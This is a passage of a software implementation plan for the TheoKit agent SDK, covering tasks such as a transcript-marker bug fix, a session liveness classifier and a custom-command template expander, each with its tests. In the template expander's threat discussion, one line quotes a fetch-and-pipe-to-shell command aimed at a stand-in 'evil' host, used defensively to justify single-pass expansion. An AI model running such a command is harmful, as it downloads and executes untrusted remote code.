- [ ] The check accepts a home the framework itself created under umask 002 — `the_check_accepts_a_home_created_by_this_framework()` passes.
- [ ] A world-writable home is still refused — `a_world_writable_home_is_still_refused()` passes.
- [ ] The docstring in `credential-store.ts` records which side moved and why, in prose a reviewer can check against the diff.
- [ ] Q3 is answered and the answer is written into `credential-store.ts` — the module states the chosen mask and its reason.

#### DoD
- [ ] `cd ../theokit-sdk && pnpm test` green.
- [ ] SDK `CHANGELOG.md` `[Unreleased] § Security`.

### T2.5 — Fix `readJsonlTail`'s `sinceMarker` substring match

#### Objective
A message whose text contains `compact_boundary` does not silently truncate the read.

#### Why this step (action + reasoning)

**What this step does.** Changes `sinceMarker` from a raw substring match to a structural record-type match.

**Why it is necessary now.** The U-10 verification found a second, previously unrecorded defect: `transcript-ops.ts:168-170` matches the marker as a substring of the line, so any user message *containing* the string truncates the transcript read at that point. This is the consumer's measured reason for not adopting the function at all (`backtrack.ts:60-73`), and it is a silent data-loss bug that any consumer would hit. The absolute-index half of U-10 is deferred (Q5) — this half is unambiguous. Cites D5.

#### Evidence
- `../theokit-sdk/.../transcript-ops.ts:161-177` — `readJsonlTail` returning bare `T[]`; `:168-170` the substring match.
- `TheoCode/packages/agent/src/session/backtrack.ts:60-73` — the measured decision not to use it: *"substring `sinceMarker` would shrink the window; measured largest transcript = 186 KiB of 23.100"*.
- `BACKLOG.md` U-10 — the original row, which recorded only the boolean-overflow half.

#### Files to edit
```
../theokit-sdk/packages/sdk/src/internal/persistence/transcript-ops.ts — structural match
../theokit-sdk/packages/sdk/tests/transcript-tail-marker.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- `readJsonlTail` is consumed through the SDK's persistence surface. Changing a substring match to a structural one **narrows** what matches, so a caller relying on the loose behaviour would break — the task greps for callers first and records the finding if any depends on the looseness.

#### Deep Dives
- **Invariant.** A record whose `type` is the marker matches; a record whose *text* contains the marker does not.
- **Edge case.** A malformed trailing line — the existing `tolerateTrailingPartialLine` behaviour is untouched.
- **Edge case.** No marker present → read the whole tail, unchanged.

> **Accepted risk (EC-25).** Narrowing a substring match to a structural one *reduces* what matches, so a caller depending on the loose behaviour breaks. That risk is accepted: the loose behaviour **is** the defect, and a caller depending on it is depending on silent data loss. The caller audit below is the mitigation — if it finds one, it is filed as a finding rather than blocking the fix.

#### Tasks
1. Grep every caller of `readJsonlTail` and record whether any relies on substring semantics.
2. Write the RED test with a user message whose text contains `compact_boundary`.
3. Change to a structural type match.
4. File the deferred absolute-index question (Q5) as a BACKLOG note rather than implementing it.

#### TDD
```
RED:     test_a_message_containing_the_marker_text_does_not_truncate_the_read()
RED:     test_a_real_marker_record_still_truncates()
RED:     test_absent_marker_reads_the_whole_tail() — regression
GREEN:   structural match
REFACTOR: None expected
VERIFY:  cd ../theokit-sdk && pnpm --filter @theokit/sdk vitest run tests/transcript-tail-marker.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] A message containing the marker text does not truncate — `a_message_containing_the_marker_text_does_not_truncate_the_read()` passes.
- [ ] A genuine marker record still truncates — `a_real_marker_record_still_truncates()` passes.
- [ ] Caller audit recorded — `grep -rn readJsonlTail` output pasted into the implementation log, with any substring-dependent caller filed as an issue.

#### DoD
- [ ] `cd ../theokit-sdk && pnpm test` green.
- [ ] SDK `CHANGELOG.md` `[Unreleased] § Fixed`.

### T2.6 — Ship the transcript-root migration hint

#### Objective
`@theokit/agents/session` answers *"the sessions moved — where did they go?"* so no product writes that notice about the framework's own layout.

#### Why this step (action + reasoning)

**What this step does.** Adds a hint function to `./session` that, given zero found sessions, reports how many projects sit under a previous transcript root.

**Why it is necessary now.** `TheoCode/packages/agent/src/session/session-ops.ts:36-52` reads `process.env.THEOKIT_HOME` — the **framework's** env var — and `readdirSync(join(legacyRoot, 'projects'))` — the **framework's** directory layout, whose `projectsRoot()` the framework took ownership of in `b30fe9f1`. A consumer is writing the migration notice for a directory only the framework controls and only the framework changed. That is the clearest ownership tell in the whole sweep. Cites D4 (the cost belongs where the cause is).

#### Evidence
- `TheoCode/packages/agent/src/session/session-ops.ts:36-52` — `legacyRootHint(found, legacyRoot)`, reading `THEOKIT_HOME` and the `projects` segment.
- `grep -rn "legacyRoot" packages/agents/src` → zero.
- `packages/agents/src/session/session-lifecycle.ts` — `projectsRoot(root?)` landed `b30fe9f1` (2026-08-15), which is the framework claiming the very path segment the hint inspects.

#### Files to edit
```
packages/agents/src/session/transcript-root-hint.ts (NEW) — the hint
packages/agents/src/session/index.ts — export it
packages/agents/tests/unit/transcript-root-hint.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- New module under `session/`; `session/index.ts` (43 LOC, `b30fe9f1`) gains one export. No in-repo production caller until adoption (T5.3) — `rules/system-design-guardrails.md § G7` is satisfied by the test in this task plus that caller.

#### Deep Dives
- **Invariant.** The hint returns `undefined` whenever it has nothing useful to say: sessions were found, the env var is unset, the roots are equal, the legacy root is unreadable, or it holds zero projects. A hint that fires spuriously is worse than none.
- **Invariant.** It reads only; it never moves or repairs anything. Migration is the operator's decision.
- **Edge case.** Legacy root unreadable (permissions or absent) → `undefined`, never a throw — this runs on the empty-state path where an exception would replace "no sessions" with a crash.

#### Pseudo-code / Signatures
```pseudocode
export function transcriptRootHint(found: number, previousRoot: string, env?: NodeJS.ProcessEnv): string | undefined
  if found > 0: return undefined
  current = (env ?? process.env).THEOKIT_HOME?.trim()
  if empty(current) or current === previousRoot: return undefined
  try: projects = readdir(projectsRoot(previousRoot))
  catch: return undefined
  if projects.length === 0: return undefined
  return `No sessions in ${current} (THEOKIT_HOME). ${projects.length} project(s) with sessions remain under ${previousRoot} — unset THEOKIT_HOME to see them, or move the contents.`

# Example
found=0, previousRoot=~/.theokit, THEOKIT_HOME=/tmp/tk, 3 projects under the old root
→ "No sessions in /tmp/tk (THEOKIT_HOME). 3 project(s) with sessions remain under ~/.theokit — …"
```

#### Tasks
1. Write the RED tests including all five `undefined` paths.
2. Implement the hint, taking `env` as an injected parameter so the test needs no global mutation.
3. Export from `./session`.
4. Add the capability-index row.

#### TDD
```
RED:     test_hint_is_undefined_when_sessions_were_found()
RED:     test_hint_is_undefined_when_the_env_var_is_unset_or_equal()
RED:     test_hint_is_undefined_when_the_previous_root_is_unreadable()
RED:     test_hint_is_undefined_when_the_previous_root_holds_no_projects()
RED:     test_hint_names_the_project_count_and_both_roots()
GREEN:   implement
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/transcript-root-hint.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] All five `undefined` paths asserted.
- [ ] `env` injected; no test mutates `process.env`.
- [ ] Never throws on an unreadable root — `hint_is_undefined_when_the_previous_root_is_unreadable()` returns `undefined`.
- [ ] Pass: size — the new file under 500 lines, per `wc -l` on the changed set.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Added`.

### T2.7 — Widen `createPendingLedger` with a payload slot and a thread extractor

#### Objective
A surface can keep its own per-question payload on a pending item without a parallel map.

#### Why this step (action + reasoning)

**What this step does.** Adds a generic payload slot to `PendingItem` and an injectable thread extractor to `createPendingLedger`.

**Why it is necessary now.** `ask/pending-ledger.ts:64` ships `createPendingLedger` and the surface does not use it, keeping its own `pending-approvals.ts` instead. The measured reason is shape: the ledger remembers *that* a question is pending, and the surface needs to hang its own render state and thread association off the same item. Without a slot, adopting the ledger means maintaining a second map keyed by the same id — strictly worse than the current single map. A primitive that ships and is not adopted is the pattern this whole plan exists to break (F-`listSubagentNames`). Cites D6.

#### Evidence
- `packages/agents/src/ask/pending-ledger.ts:64` — `createPendingLedger`, shipped.
- Audit `2026-08-15-theocode-100pct-adoption.md:15` — `createPendingLedger` among the published-and-unused symbols swept.
- `TheoCode/packages/tui/src/consent/pending-approvals.ts` — the surviving surface-side ledger.
- `packages/agents/src/ask/index.ts:12-16` — the module's own docstring: *"`createPendingLedger` is the SURFACE side: it remembers what has already been shown and answered, which the framework's stateless `list()` cannot."* The surface side is exactly the side that needs the slot.

#### Files to edit
```
packages/agents/src/ask/pending-ledger.ts — generic payload + thread extractor
packages/agents/src/ask/index.ts — widen the exported types
packages/agents/tests/unit/pending-ledger-payload.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- `pending-ledger.ts` is exported from `./ask`. Making `PendingItem` generic with a default (`PendingItem<TPayload = undefined>`) is source-compatible: every existing use without a type argument keeps compiling.
- No in-repo production caller; the external consumer is TheoCode's consent module (T5.1's neighbourhood).

#### Deep Dives
- **Invariant.** The default type argument keeps every current call site valid — verified by a type test, not by inspection.
- **Invariant.** The ledger stays the surface's memory; the framework never reads the payload. It is an opaque slot.
- **Edge case.** Two questions on the same thread → the extractor returns the same thread id for both and the ledger must keep them as distinct items. Grouping is the surface's job; the ledger must not collapse.

#### Pseudo-code / Signatures
```pseudocode
export interface PendingItem<TPayload = undefined> { id: string; question: PendingQuestion; threadId?: string; payload?: TPayload }
export function createPendingLedger<TPayload = undefined>(opts?: {
  threadOf?: (q: PendingQuestion) => string | undefined
}): PendingLedger<TPayload>

# Example
const ledger = createPendingLedger<{ renderedAt: number }>({ threadOf: q => q.meta?.thread })
ledger.add(q, { renderedAt: now })
ledger.byThread('t-1')   → both pending items on that thread, still distinct
```

#### Tasks
1. Write the RED tests, including two items on one thread and the default-type-argument compatibility.
2. Make `PendingItem` and the ledger generic with defaults.
3. Add the injectable `threadOf` extractor and a `byThread` reader.
4. Widen the `./ask` exports.
5. Add the capability-index row.

#### TDD
```
RED:     test_a_payload_round_trips_on_a_pending_item()
RED:     test_two_questions_on_one_thread_stay_distinct_items()
RED:     test_a_repeated_id_replaces_rather_than_duplicating_and_keeps_the_latest_payload() — EC-20
RED:     test_existing_call_sites_compile_without_a_type_argument() — expectTypeOf, per rules/type-safety.md
GREEN:   implement the widening
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/pending-ledger-payload.test.ts
```

#### Concurrency tests

(none — single-threaded)
The ledger is surface-local state mutated from the render loop; the framework never touches it concurrently.

#### Acceptance Criteria
- [ ] Payload round-trips and is never read by the framework — `a_payload_round_trips_on_a_pending_item()` passes and `grep -n 'payload' packages/agents/src/ask/pending-ledger.ts` shows no read.
- [ ] Two items on one thread stay distinct — `two_questions_on_one_thread_stay_distinct_items()` passes.
- [ ] `expectTypeOf` proves the default argument keeps old call sites valid.
- [ ] Pass: size — `wc -l` on the changed file under 500.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Added`.

---

## Phase 3: The surface primitives

**Objective:** ship the two primitives the terminal surface rebuilt, in the packages that own the contracts.

### T3.1 — Ship default tool header / body / approval maps in `@theokit/tui`

#### Objective
`@theokit/tui` exports overridable defaults keyed by the `@theokit/agents` tool names.

#### Why this step (action + reasoning)

**What this step does.** Adds a module exporting three maps — header, body and approval-label — keyed by the framework's tool names, each entry overridable, and wires them as defaults where the existing components consume a name.

**Why it is necessary now.** The consumer's `tool-header.ts` is 292 LOC holding `HEADERS_BY_TOOL:34`, `BODY_BY_TOOL:90` and `APPROVAL_LABELS:192` — all keyed by names the framework defines, with `registry.ts:107-114` throwing `tool_name_mismatch` to hold the key contract **by hand**. The framework owns both halves of that contract (the factories own the names, the TUI package owns the rendering), so it is the only place they can be kept in sync. Cites D6 and the Step 1 correction: `ToolResult`, `ToolCardResult`, `CostMeter` and `TokenUsageChart` already ship, so only the name→presentation maps are missing.

#### Evidence
- `TheoCode/packages/tui/src/formatting/tool-header.ts:34,90,192` — the three maps; 292 LOC total.
- `TheoCode/packages/agent/src/tools/registry.ts:107-114` — the hand-held name contract.
- `../theokit-tui/src/index.ts:53-55` — `ToolResult`, `ToolCardResult`, `ShellEnvelope` already exported; `:94-102` `TokenUsageChart`, `CostMeter`.
- `packages/agents/src/tools-entry.ts` — the factories that own the names.

#### Files to edit
```
../theokit-tui/src/tool-header-map.ts (NEW) — the three default maps + the override type
../theokit-tui/src/index.ts — export them
../theokit-tui/src/tool-header-map.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- `theokit-tui/src/index.ts` (263 LOC): additive export only.
- The maps' keys must be exactly the names `@theokit/agents/tools` factories produce. `theokit-tui` does **not** depend on `@theokit/agents` (and must not — that would invert the direction), so the key list is duplicated knowledge. The test asserts the key set against a literal list, and the drift risk is recorded as a finding rather than solved by adding a dependency.

#### Deep Dives
- **Invariant.** Overriding one entry must not require restating the others — the API takes a partial override merged over the defaults.
- **Invariant (direction).** `theokit-tui` never imports `@theokit/agents` (`rules/system-design-guardrails.md § G1`).
- **Edge case.** A tool name with no entry → a generic default (`Running <name>` / `Ran <name>`), never a crash and never an empty string.
- **Edge case.** The diff counts in `Editing/Edited <file> (+n/-m)` are computed from patch text; that computation stays the consumer's unless the patch shape is framework-owned — measured during the task, not assumed.

#### Pseudo-code / Signatures
```pseudocode
export type ToolPresentation = {
  header(input: unknown, active: boolean): string
  body?(result: unknown): ToolCardResult
  approvalLabel?(input: unknown): string
}
export const DEFAULT_TOOL_PRESENTATION: ReadonlyMap<string, ToolPresentation>
export function toolPresentation(overrides?: Record<string, Partial<ToolPresentation>>): ReadonlyMap<string, ToolPresentation>

# Example
toolPresentation({ run_shell: { header: (i, a) => a ? 'Executando…' : 'Executado' } })
  → map where run_shell is overridden and the other 23 keep defaults
```

#### Tasks
1. Enumerate the tool names `@theokit/agents/tools` produces (literal list, from the factories).
2. Write the RED tests, including the unknown-name fallback and partial override.
3. Implement the three default maps.
4. Export from the barrel.
5. Record the key-set drift risk as a comment naming the source of the names.

#### TDD
```
RED:     test_defaults_cover_every_shipped_tool_name()
RED:     test_unknown_tool_falls_back_to_a_generic_header()
RED:     test_a_partial_override_keeps_the_other_defaults()
GREEN:   implement the maps
REFACTOR: None expected
VERIFY:  cd ../theokit-tui && pnpm vitest run src/tool-header-map.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] Every name the tool factories produce has a default entry — `defaults_cover_every_shipped_tool_name()` passes.
- [ ] Unknown name yields a generic header — `unknown_tool_falls_back_to_a_generic_header()` passes and throws nothing.
- [ ] Partial override merges — `a_partial_override_keeps_the_other_defaults()` passes.
- [ ] Direction preserved — no `@theokit/agents` import in `theokit-tui`.
- [ ] Pass: size — `wc -l` on the new file under 500.

#### DoD
- [ ] `cd ../theokit-tui && pnpm test` green.
- [ ] `theokit-tui` `CHANGELOG.md` `[Unreleased] § Added`.

### T3.2 — Absorb the liveness oracle into `@theokit/agents/session`

#### Objective
Classifying a project directory ALIVE/DEAD/UNDETERMINED under a shared search budget is a framework capability with injected enumeration.

#### Why this step (action + reasoning)

**What this step does.** Moves the oracle's logic into the layer with `listProjects()` as a required injected parameter, preserving the shared DFS node budget.

**Why it is necessary now.** The question exists *because of a framework decision*: `encodeProjectDir` is lossy, so a moved project can only be found by searching. The consumer wrote 188 lines of search plus a budget because the framework made the encoding one-way. The 2026-08-15 audit already correctly separated the halves — enumeration is product policy, the liveness question is not. Cites D4. **Blocked on Q2**: if `encodeProjectDir` becomes reversible, this task is throwaway, which is why Q2 is asked before the task starts.

#### Evidence
- `TheoCode/packages/agent/src/session/liveness-oracle.ts:22-38` — the docstring's measurement: 13.269 project directories, ~3.200 falling through to filesystem search, ~64M syscalls without a shared budget.
- `TheoCode/packages/agent/src/session/gc/all-sessions.ts` — 442 LOC of sweep around it.
- `packages/agents/src/session/gc/transcript-gc.ts:96` — `TranscriptGCOptions.cwd`, single-project by construction.
- Audit `2026-08-15-theocode-100pct-adoption.md:39` — *"Product policy. Its enumeration is injected (`opts.listProjects()`) … the only framework knowledge in it was the `projects` path segment, now `projectsRoot()`."*

#### Files to edit
```
packages/agents/src/session/liveness-oracle.ts (NEW) — the classifier + shared budget
packages/agents/src/session/index.ts — export it
packages/agents/tests/unit/liveness-oracle.test.ts (NEW) — RED first
packages/agents/tests/fixtures/projects/ (NEW) — synthetic tree at reduced scale
```

#### Deep file dependency analysis
- New module inside `session/`, consumed by nothing in-repo at first; the consumer is the adoption phase. `rules/system-design-guardrails.md § G7` requires an export to have a caller or a test — the test is in this task and the caller in T5.3.
- `session/index.ts` (43 LOC, `b30fe9f1`): additive.

#### Deep Dives
- **The three-valued result is load-bearing.** `UNDETERMINED` is not a soft `DEAD`: deleting on "we could not tell" is data loss. The type must make the third state unrepresentable-as-dead, and the GC must refuse to delete on it.
- **Invariant.** The DFS budget is shared **across the whole sweep**, not per-project — that is the difference between ~64M syscalls and a bounded run.
- **Invariant (property, scale-independent — Risk R5).** Total filesystem operations ≤ the configured budget, asserted at fixture scale and true at any scale.
- **Edge case.** Budget exhausted mid-sweep → every remaining project is `UNDETERMINED`, never `DEAD`. Fail-safe, per `rules/error-handling.md`.
- **Edge case.** A project directory that exists but is unreadable (permissions) → `UNDETERMINED` with the reason, not `DEAD`.

#### Pseudo-code / Signatures
```pseudocode
export type Liveness = 'alive' | 'dead' | 'undetermined'
export function classifyProjects(
  encoded: string[],
  opts: { listProjects: () => string[]; budget: number; fs?: FsSeam },
): Map<string, { liveness: Liveness; reason: string }>
  remaining = opts.budget
  for enc in encoded:
    if directExists(decodeIfPossible(enc)): mark alive; continue
    if remaining <= 0: mark undetermined('budget exhausted'); continue
    found, spent = searchWithin(opts.listProjects(), enc, remaining)
    remaining -= spent
    mark found ? alive : (remaining > 0 ? dead : undetermined('budget exhausted'))

# Example
budget=100, 3 encoded dirs, 1 resolves directly, 1 found after 40 ops, 1 needs 80
→ { a: alive, b: alive, c: undetermined('budget exhausted') }   # never dead-by-exhaustion
```

#### Tasks
1. Confirm Q2's answer (blocking — if `encodeProjectDir` becomes reversible, stop).
2. Build the synthetic fixture tree.
3. Write the RED tests including budget exhaustion and unreadable directory.
4. Implement the classifier with an injected fs seam.
5. Export from `./session`.
6. Add the capability-index row.

#### TDD
```
RED:     test_a_directly_resolvable_project_is_alive_without_search()
RED:     test_a_moved_project_is_found_within_budget_and_is_alive()
RED:     test_budget_exhaustion_yields_undetermined_never_dead()
RED:     test_an_unreadable_directory_is_undetermined_with_a_reason()
RED:     test_total_fs_operations_never_exceed_the_budget() — the scale-independent property
RED:     test_a_symlink_cycle_terminates_within_budget_and_yields_undetermined() — EC-9
RED:     test_enumeration_failure_yields_undetermined_for_every_project_with_a_typed_error() — EC-10
GREEN:   implement the classifier
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/liveness-oracle.test.ts
```

> **Accepted risk (EC-24).** The Global DoD requires observing this oracle against the operator's real tree, historically 13.269 project directories. That count will differ whenever it runs. The assertion is **equivalence between the two implementations on whatever tree exists**, plus the scale-independent budget property — not reproduction of the historical number. Recorded so a differing count is not mistaken for a failed verification.

#### Concurrency tests

(none — single-threaded)
The sweep is sequential by design: the budget is shared mutable state and making it concurrent would require synchronising it, which the consumer's measured implementation deliberately avoided.

#### Acceptance Criteria
- [ ] Three-valued result; `UNDETERMINED` never collapses to `DEAD`.
- [ ] Budget shared across the sweep — `total_fs_operations_never_exceed_the_budget()` passes at fixture scale.
- [ ] Enumeration is injected — `grep -n 'readdir' packages/agents/src/session/liveness-oracle.ts` returns nothing outside the injected seam.
- [ ] Pass: size — `wc -l packages/agents/src/session/liveness-oracle.ts` under 500 (the consumer's is 188).
- [ ] Pass: coverage — `pnpm test:coverage` reports 100% on the budget-exhaustion and unreadable-directory branches.

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Added` naming consumer gap **U-1**.

### T3.3 — Expand custom-command templates in `@theokit/agents/config`

#### Objective
The package that loads a custom command also expands its body: `$N` placeholders, argument splitting, `` !`shell` `` and `@file` inlining.

#### Why this step (action + reasoning)

**What this step does.** Adds a template expander alongside `loadCustomCommands`, taking `shell`, `readFile` and `warn` as injected dependencies.

**Why it is necessary now.** The framework reads the command file and its frontmatter and stops. The consumer's `command-template.ts` is 112 LOC with **zero framework imports**, implementing `$1`/`$2` placeholders, quote-aware argument splitting, `` !`shell` `` execution and `@file` inlining under a 64 KB cap. That is a *format* convention shared with every custom-command implementation in this space, not product policy — and the framework already owns the half that reads the file, so owning the half that interprets it keeps one owner for one format. Its dependencies are already injected in the consumer's design, which is exactly the shape a framework primitive needs. Cites D6 and `rules/parsimony-ladder.md` rung 1 applied in reverse: this needs to exist *once*, and it currently exists only downstream.

#### Evidence
- `TheoCode/packages/tui/src/commands/command-template.ts:1-20` — `SHELL_REGEX`, `FILE_REGEX`, `PLACEHOLDER_REGEX`, `ARGS_REGEX`, `FILE_INLINE_CAP = 64 * 1024`, and `TemplateDeps { shell, readFile, warn }`.
- `grep -rn "template|\$ARGUMENTS|placeholder" packages/agents/src/config/custom-commands.ts` → no expansion; the framework loads and returns.
- `commands/` sweep: 2.659 production LOC, of which the surface analysis named ~282 absorbable with template expansion the largest single item.

#### Files to edit
```
packages/agents/src/config/command-template.ts (NEW) — the expander
packages/agents/src/config-entry.ts — export it on ./config
packages/agents/tests/unit/command-template.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- New module beside `custom-commands.ts` (260 LOC, `339852de`) inside `config/`, exported through `packages/agents/src/config-entry.ts` (97 LOC, `d9899a77`) — the `./config` subpath, which **already ships with 34 symbols**. No ordering dependency on T4.2.
- No in-repo production caller; the consumer arrives in T5.2.

> **v1.1 correction, recorded rather than silently fixed.** v1.0's Context & memory comparison and an earlier note in this task both described `./config` as "still landing" and reachable "only through the deprecated `theokit/server` umbrella". That is false: `config-entry.ts` exists, `./config` is in `packages/agents/package.json#exports`, and gap 20 in this same plan correctly lists it among the *stale* Honest-gaps rows. Two statements in one plan contradicted each other; the one backed by the file on disk wins. This is the same defect class as the capability index's own stale rows — which is why T0.1's inverse assertion (a symbol listed as an honest gap MUST NOT resolve) also protects this plan's claims.

#### Deep Dives
- **Invariant (security).** `` !`shell` `` executes arbitrary commands from a file the user authored. The expander MUST NOT execute anything itself — it calls the injected `shell`, so the trust decision (is this directory trusted?) stays with the caller that already owns trust posture. Shipping an expander that spawns directly would move a trust boundary silently, which `rules/system-design-guardrails.md § G10` forbids.
- **Invariant (security, EC-4) — expansion is SINGLE-PASS and inlined content is INERT.** The output of `@file` inlining and of `` !`shell` `` is **never re-scanned**. Without this, a file containing `` !`curl evil.sh | sh` `` becomes command execution triggered by a template that never named that command — and `@file` references get far less scrutiny than shell segments when a human reviews a template. Single-pass makes the injection unrepresentable rather than filtered, which is the difference between a rule and a blocklist.
- **Invariant.** The 64 KB inline cap is a real limit and is preserved: a larger file is truncated with a `warn`, never inlined whole and never silently dropped.
- **Edge case.** A `$3` placeholder with only two arguments supplied → empty substitution plus a `warn`, never the literal `$3` leaking into the prompt.
- **Edge case (EC-11).** `@file` naming a path the injected `readFile` returns `undefined` for → `warn` naming the path plus empty substitution. The literal `@name` must not survive into the output, for the same reason `$N` must not: a leaked reference reads to the model as content the user wrote.
- **Edge case (EC-12).** A file of **exactly** 64 KB is inlined whole; one byte over is truncated with the warn. "Larger is truncated" leaves the equality case unstated, and the equality case is where an off-by-one lives.
- **Edge case (EC-13).** A shell segment returning `ok: false` → its output is substituted **and** a `warn` is emitted. Substituting silence would turn a broken command into a prompt that reads as though it had succeeded, which is the failure the model cannot detect.
- **Edge case.** `@file` naming a path outside the project → the reader is injected, so containment is the caller's, and the expander must not attempt its own path resolution. Stated explicitly because a second containment check that disagrees with the first is the `assertNoSymlinkEscape` class of bug this ecosystem already paid for once.
- **Edge case.** Quoted arguments (`"a b"`) count as one argument — the consumer's `QUOTE_TRIM_REGEX` behaviour, preserved.

#### Pseudo-code / Signatures
```pseudocode
export interface TemplateDeps { shell(cmd: string): Promise<{text: string; ok: boolean}>; readFile(name: string): string | undefined; warn(m: string): void }
export async function expandCommandTemplate(template: string, rawArgs: string, deps: TemplateDeps): Promise<string>
export function templateHints(template: string): string[]     -- the $N names, for the palette

# Example
template: 'Review $1 with !`git diff --stat` and @README.md'
rawArgs:  '"src/a.ts"'
→ 'Review src/a.ts with <git diff --stat output> and <README.md contents, ≤64KB>'
```

#### Tasks
1. Write the RED tests, including the missing-placeholder warn and the cap truncation.
2. Implement the expander with injected deps; never spawn directly.
3. Implement `templateHints` for palette rendering.
4. Export from `./config` (or the umbrella, per the ordering note).
5. Add the capability-index row.

#### TDD
```
RED:     test_numbered_placeholders_substitute_positionally()
RED:     test_quoted_arguments_count_as_one()
RED:     test_a_missing_placeholder_warns_and_substitutes_empty_never_leaks_the_literal()
RED:     test_shell_segments_call_the_injected_shell_and_never_spawn_directly()
RED:     test_inlined_file_content_is_inert() — EC-4: a fixture containing !`echo pwned` yields that TEXT
                                          and the injected shell is never called for it
RED:     test_shell_output_is_not_rescanned_for_placeholders_or_references() — EC-4, the other half
RED:     test_a_missing_file_reference_warns_and_substitutes_empty() — EC-11, no literal @name leak
RED:     test_a_file_of_exactly_the_cap_is_inlined_whole() — EC-12 boundary
RED:     test_one_byte_over_the_cap_is_truncated_with_a_warning() — EC-12 boundary
RED:     test_a_failed_shell_segment_substitutes_its_output_and_warns_never_silence() — EC-13
RED:     test_hints_lists_the_declared_placeholders()
GREEN:   implement
REFACTOR: None expected
VERIFY:  pnpm --filter @theokit/agents vitest run tests/unit/command-template.test.ts
```

#### Concurrency tests

(none — single-threaded)
Expansion awaits the injected `shell` sequentially per segment; there is no shared mutable state across segments.

#### Acceptance Criteria
- [ ] The expander never spawns a process itself — asserted by a test whose injected `shell` is the only path that can run.
- [ ] Cap truncation warns — `one_byte_over_the_cap_is_truncated_with_a_warning()` passes and the injected `warn` receives the path.
- [ ] A missing placeholder never leaks `$N` into the output.
- [ ] Pass: complexity — each exported function under 10 cyclomatic, reported by `pnpm lint`.
- [ ] Pass: size — `wc -l packages/agents/src/config/command-template.ts` under 500 (the consumer's is 112).

#### DoD
- [ ] `pnpm --filter @theokit/agents test` green.
- [ ] `CHANGELOG.md` `[Unreleased] § Added`.

### T3.4 — Ship the centred-anchor window and capability-derived shortcut list in `@theokit/tui`

#### Objective
`@theokit/tui` supports a centred selection anchor and derives its keyboard-help list from declared capabilities.

#### Why this step (action + reasoning)

**What this step does.** Adds a centred-anchor option to the existing window model and a helper that builds the shortcut list from a capability set rather than a hand-written literal.

**Why it is necessary now.** These are the two remaining `components/` items the surface sweep named (~30 and ~72 LOC). The window half is the surviving remnant of U-10: `select-list-model.ts:24-27` already exposes `hiddenBefore`/`hiddenAfter` as counts in 0.53.0, and only the *anchor* (trailing vs centred) is still the consumer's. Closing a 30-line remnant is cheap and it takes U-10's TUI half to fully closed. Cites D6.

#### Evidence
- `../theokit-tui/src/select-list-model.ts:21-30` — `WindowView` with `hiddenBefore`/`hiddenAfter`, shipped in 0.53.0.
- `TheoCode/packages/tui/src/backtrack/BacktrackOverlay.tsx:22-24` — the consumer's comment calling the boolean-only overflow an SDK gap; the verification found the framework closed that half and only the anchor remains.
- Surface sweep: `components/` 992 LOC, ~130 absorbable, of which `windowAround` ~30 and the shortcut list ~72.

#### Files to edit
```
../theokit-tui/src/select-list-model.ts — centred-anchor option
../theokit-tui/src/keyboard-help-model.ts (NEW) — capability-derived shortcut list
../theokit-tui/src/index.ts — export both
../theokit-tui/src/select-list-model.test.ts — extend (RED)
../theokit-tui/src/keyboard-help-model.test.ts (NEW) — RED first
```

#### Deep file dependency analysis
- `select-list-model.ts` is exported and consumed; adding an *option* with the current behaviour as default is source-compatible. The default MUST remain trailing, or every existing list silently re-anchors.
- `index.ts` (263 LOC): additive exports.

#### Deep Dives
- **Invariant.** Default anchor stays trailing. Centred is opt-in.
- **Invariant.** Near the ends of the list, a centred anchor cannot centre — it clamps, and the clamped case is where off-by-one bugs live, so it is tested at both ends explicitly.
- **Edge case.** Window larger than the list → no hidden counts, no clamping, selection unchanged.
- **Edge case.** A capability with no bound key → omitted from the help list rather than rendered with an empty key.

#### Pseudo-code / Signatures
```pseudocode
export function windowAround(total: number, selected: number, size: number, anchor: 'trailing' | 'centred' = 'trailing'): WindowView
export function keyboardHelpFor(capabilities: ReadonlyArray<{ id: string; label: string; key?: string }>): ReadonlyArray<{ key: string; label: string }>

# Example
windowAround(total=10, selected=0, size=5, 'centred') → { start: 0, end: 5, hiddenBefore: 0, hiddenAfter: 5 }   # clamped at the head
windowAround(total=10, selected=5, size=5, 'centred') → { start: 3, end: 8, hiddenBefore: 3, hiddenAfter: 2 }
```

#### Tasks
1. Write the RED tests for both anchors, both clamped ends, and the oversized window.
2. Add the anchor option, defaulting to trailing.
3. Implement `keyboardHelpFor`, omitting unbound capabilities.
4. Export both.

#### TDD
```
RED:     test_default_anchor_is_trailing_and_unchanged() — regression
RED:     test_centred_anchor_centres_in_the_middle_of_a_long_list()
RED:     test_centred_anchor_clamps_at_the_head_and_at_the_tail()
RED:     test_window_larger_than_the_list_hides_nothing()
RED:     test_size_zero_and_selection_out_of_range_clamp_without_negative_indices() — EC-17
RED:     test_an_unbound_capability_is_omitted_from_the_help_list()
GREEN:   implement both
REFACTOR: None expected
VERIFY:  cd ../theokit-tui && pnpm vitest run src/select-list-model.test.ts src/keyboard-help-model.test.ts
```

#### Concurrency tests

(none — single-threaded)

#### Acceptance Criteria
- [ ] Trailing remains the default — `default_anchor_is_trailing_and_unchanged()` passes.
- [ ] Both clamped ends covered — `centred_anchor_clamps_at_the_head_and_at_the_tail()` passes.
- [ ] Unbound capability omitted — `an_unbound_capability_is_omitted_from_the_help_list()` passes.
- [ ] Pass: size — changed files under 500 lines, per `wc -l` on the changed set.

#### DoD
- [ ] `cd ../theokit-tui && pnpm test` green.
- [ ] `theokit-tui` `CHANGELOG.md` `[Unreleased] § Added`.

---

## Phase 4: The gate that was missing

